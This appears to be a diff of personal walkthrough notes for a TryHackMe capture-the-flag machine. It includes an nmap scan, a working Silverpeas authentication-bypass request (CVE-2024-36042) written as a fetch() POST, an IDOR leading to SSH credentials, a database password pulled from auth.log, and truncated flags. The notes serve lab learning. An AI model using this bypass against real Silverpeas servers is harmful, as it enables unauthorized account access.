@@ -1,0 +1,79 @@
+IP = 10.10.29.17
+
+# Nmap 7.95 scan initiated Wed Aug 20 13:32:31 2025 as: /usr/lib/nmap/nmap --privileged -sV -oN nmap/initial 10.10.29.17
+Nmap scan report for tryhackme.thm (10.10.29.17)
+Host is up (0.22s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http       nginx 1.18.0 (Ubuntu)
+8080/tcp open  http-proxy
+1 service unrecognized despite returning data.
+
+
+found out a login  page http://IP:8080/silverpeas/
+
+CVE-2024-36042.md // https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d
+
+got in using the vulnerability 
+fetch("http://tryhackme.thm:8080/silverpeas/AuthenticationServlet", {
+  headers: {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "proxy-connection": "keep-alive",
+    "upgrade-insecure-requests": "1"
+  },
+  referrer: "http://tryhackme.thm:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1",
+  referrerPolicy: "strict-origin-when-cross-origin",
+  body: "Login=SilverAdmin&DomainId=0",
+  method: "POST",
+  mode: "cors",
+  credentials: "include"
+})
+.then(res => res.text()) // treat response as HTML/text
+.then(data => {
+  document.open();
+  document.write(data); // replace current page content
+  document.close();
+})
+.catch(console.error);
+
+I found a XSS vulnerability posted on github (https://github.com/toneemarqus/CVE-2024-39031)
+
+
+through digging in the notifications , we found an Insecure Direct Object Reference (IDOR) exploit which got us an SSH entry :
+
+Username: tim
+
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol 
+
+
+first flag found 
+
+
+
+i found that the user we logged in with is ADM which is by looking in wiki.debian/systemGroupd ==> adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log
+
+and i found this  in the log directory 
+
+
+auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
+
+
+
+
+
+
+
+#1 What is the user flag?
+
+THM{c4..
+
+
+
+#2 What is the root flag? 
+
+
+THM{09..
